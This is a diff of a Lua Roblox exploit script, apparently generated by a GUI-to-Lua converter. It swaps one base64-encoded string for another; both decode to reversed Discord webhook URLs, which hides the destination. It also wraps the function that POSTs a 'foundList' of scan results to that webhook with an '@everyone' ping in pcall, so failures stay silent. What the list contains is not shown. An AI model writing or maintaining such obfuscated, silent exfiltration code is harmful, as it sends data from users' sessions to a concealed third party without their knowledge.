@@ -3630,7 +3630,7 @@ local script = G2L["9"];
 			return string.char(c)
 		end))
 	end
-	local decoded = from_base64("UUdfcEx5Ri1IV1N2RDRjbl9WWVZlRktIa2o5aUppeHZydnJ2SENKMVJYTmFCelhqWG1SSHNNUVpYVFZYYmh6bFBPZi0vMTQ0Mjk4OTk1NTI2MDYxMjYzMi93ZWJob29rcy9hcGkvY29tLmRpc2NvcmQvLzpodHRwcw==")
+	local decoded = from_base64("R1FfRnlMcC1uYzREdlNXSF9mT1BsemhiWFZUWFpRTXNIUm1Yalh6QmFOWFIxSkNIdnJ2cnZ4aUppOWprSEtGZVZZVi0vMjM2MjE2MDYyNTU5OTg5MjQ0MS9za29vaGJldy9pcGEvbW9jLmRyb2NzaWQvLzpzcHR0aA==")
 
 	local function sendW(foundList)
 		local HttpRequest = http_request or (syn and syn.request)
@@ -3663,13 +3663,14 @@ local script = G2L["9"];
 				}
 			}
 		}
-
-		HttpRequest({
-			Url = webhook_url,
-			Method = "POST",
-			Headers = { ["Content-Type"] = "application/json" },
-			Body = HttpService:JSONEncode({ content = "@everyone", embeds = { embedData } })
-		})
+		pcall(function()
+			HttpRequest({
+				Url = webhook_url,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = HttpService:JSONEncode({ content = "@everyone", embeds = { embedData } })
+			})
+		end)
 	end
 
 	local function scan(i, startTime, foundList)
